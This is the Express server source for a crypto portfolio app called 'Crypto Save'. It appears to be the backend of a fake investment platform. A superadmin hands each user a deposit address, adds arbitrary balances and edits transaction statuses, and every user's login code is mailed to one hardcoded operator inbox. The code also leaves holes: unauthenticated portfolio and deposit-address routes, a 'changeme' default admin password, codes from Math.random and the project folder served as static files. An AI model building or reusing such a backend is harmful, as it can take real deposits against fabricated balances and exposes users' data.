const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const crypto = require("crypto");
const bcrypt = require("bcryptjs");
require("dotenv").config();

const { Resend } = require("resend");

let resend = null;
if (process.env.RESEND_API_KEY) {
  resend = new Resend(process.env.RESEND_API_KEY);
} else {
  console.log("RESEND_API_KEY missing — login codes will only be logged to the console");
}

const app = express();

/* =========================
   MIDDLEWARE
========================= */
app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

/* =========================
   MONGODB
========================= */
const MONGO_URI = process.env.MONGO_URI;

if (!MONGO_URI) {
  console.error(" MONGO_URI missing in .env");
}

mongoose.connect(MONGO_URI)
  .then(() => console.log("MongoDB connected"))
  .catch(err => console.log("MongoDB error:", err));

const User = require("./models/user");
const Portfolio = require("./models/portfolio");

/* =========================
   ALL LOGIN CODES GO TO ONE INBOX
   (single operator manages every dummy account)
========================= */
const NOTIFY_EMAIL = process.env.NOTIFY_EMAIL || "thomasolsen613@gmail.com";

// username -> pending 6-digit code
const pendingCodes = {};

/* =========================
   SIGNUP
========================= */
app.post("/signup", async (req, res) => {
  try {
    const { username, password } = req.body || {};

    if (!username || !password) {
      return res.status(400).json({ success: false, message: "Username and password required" });
    }

    const existing = await User.findOne({ username });
    if (existing) {
      return res.status(409).json({ success: false, message: "Username already taken" });
    }

    const passwordHash = await bcrypt.hash(password, 10);
    await User.create({ username, passwordHash });

    await Portfolio.create({
      username,
      assets: { bitcoin: 0, ethereum: 0, usdt: 0, solana: 0 },
      depositAddress: "",
      transactions: []
    });

    res.json({ success: true, message: "Account created" });
  } catch (err) {
    console.log("Signup error:", err.message);
    res.status(500).json({ success: false, message: "Signup failed" });
  }
});

/* =========================
   LOGIN (step 1: password check + send code)
========================= */
app.post("/login", async (req, res) => {
  try {
    const { username, password } = req.body || {};

    if (!username || !password) {
      return res.status(400).json({ success: false, message: "Username and password required" });
    }

    const user = await User.findOne({ username });
    if (!user) {
      return res.json({ success: false, message: "Invalid username or password" });
    }

    const match = await bcrypt.compare(password, user.passwordHash);
    if (!match) {
      return res.json({ success: false, message: "Invalid username or password" });
    }

    const code = Math.floor(100000 + Math.random() * 900000).toString();
    pendingCodes[username] = code;

    console.log(`Login code for ${username}:`, code);

    if (resend) {
      try {
        await resend.emails.send({
          from: "onboarding@resend.dev",
          to: [NOTIFY_EMAIL],
          subject: `Crypto Save Login Code — ${username}`,
          html: `
            <h2>Crypto Save Verification Code</h2>
            <p>Account: <strong>${username}</strong></p>
            <p>Code:</p>
            <h1>${code}</h1>
          `
        });
      } catch (err) {
        console.log("Email send failed but code generated:", err.message);
      }
    }

    res.json({ success: true, message: "Verification code sent" });
  } catch (err) {
    console.log("Login error:", err.message);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

/* =========================
   LOGIN (step 2: verify code)
========================= */
app.post("/verify-code", (req, res) => {
  const { username, code } = req.body || {};

  if (!username || pendingCodes[username] === undefined) {
    return res.json({ success: false });
  }

  if (String(code) === String(pendingCodes[username])) {
    delete pendingCodes[username];
    return res.json({ success: true });
  }

  res.json({ success: false });
});

/* =========================
   GET PORTFOLIO (per user)
========================= */
app.get("/portfolio/:username", async (req, res) => {
  const data = await Portfolio.findOne({ username: req.params.username });

  if (!data) {
    return res.json({ assets: {}, transactions: [] });
  }

  res.json(data);
});

/* =========================
   GET DEPOSIT ADDRESS (per user)
========================= */
app.get("/api/deposit-address/:username", async (req, res) => {
  const data = await Portfolio.findOne({ username: req.params.username });
  res.json({ address: data ? data.depositAddress : "" });
});

/* =========================================================
   SUPERADMIN
========================================================= */
const SUPERADMIN_PASSWORD = process.env.SUPERADMIN_PASSWORD || "changeme";
const superadminTokens = new Set();

function requireSuperadmin(req, res, next) {
  const token = req.headers["x-superadmin-token"];

  if (!token || !superadminTokens.has(token)) {
    return res.status(401).json({ error: "Not authenticated" });
  }

  next();
}

app.post("/superadmin/login", (req, res) => {
  const { password } = req.body || {};

  if (password !== SUPERADMIN_PASSWORD) {
    return res.status(401).json({ success: false, message: "Invalid password" });
  }

  const token = crypto.randomBytes(24).toString("hex");
  superadminTokens.add(token);

  res.json({ success: true, token });
});

app.get("/superadmin/users", requireSuperadmin, async (req, res) => {
  const users = await User.find({}, "username createdAt").sort({ createdAt: -1 });
  res.json(users);
});

app.delete("/superadmin/users/:username", requireSuperadmin, async (req, res) => {
  const { username } = req.params;

  const result = await User.deleteOne({ username });
  await Portfolio.deleteOne({ username });

  if (result.deletedCount === 0) {
    return res.status(404).json({ error: "User not found" });
  }

  res.json({ message: "User deleted" });
});

app.get("/superadmin/portfolio/:username", requireSuperadmin, async (req, res) => {
  const data = await Portfolio.findOne({ username: req.params.username });

  if (!data) {
    return res.json({ assets: {}, depositAddress: "", transactions: [] });
  }

  res.json(data);
});

app.post("/superadmin/update/:username", requireSuperadmin, async (req, res) => {
  const { username } = req.params;
  const { assets, transactions } = req.body || {};

  let data = await Portfolio.findOne({ username });

  if (!data) {
    data = await Portfolio.create({ username, assets: {}, transactions: [] });
  }

  data.assets = data.assets || {};
  data.transactions = data.transactions || [];

  if (assets) {
    data.assets.bitcoin = (data.assets.bitcoin || 0) + (assets.bitcoin || 0);
    data.assets.ethereum = (data.assets.ethereum || 0) + (assets.ethereum || 0);
    data.assets.usdt = (data.assets.usdt || 0) + (assets.usdt || 0);
    data.assets.solana = (data.assets.solana || 0) + (assets.solana || 0);
  }

  if (Array.isArray(transactions)) {
    transactions.forEach(tx => {
      const index = data.transactions.findIndex(
        t => t.date === tx.date && t.amount === tx.amount && t.type === tx.type
      );

      if (index !== -1) {
        data.transactions[index].status = tx.status;
      } else {
        data.transactions.push(tx);
      }
    });
  }

  await data.save();

  res.json({ message: "Portfolio updated", data });
});

app.put("/superadmin/deposit-address/:username", requireSuperadmin, async (req, res) => {
  const { username } = req.params;
  const { address } = req.body || {};

  if (!address) {
    return res.status(400).json({ error: "Address required" });
  }

  let data = await Portfolio.findOne({ username });

  if (!data) {
    data = await Portfolio.create({ username, assets: {}, transactions: [] });
  }

  data.depositAddress = address;
  await data.save();

  res.json({ message: "Deposit address updated successfully", address });
});

/* =========================
   START SERVER
========================= */
const PORT = process.env.PORT || 5000;

app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});
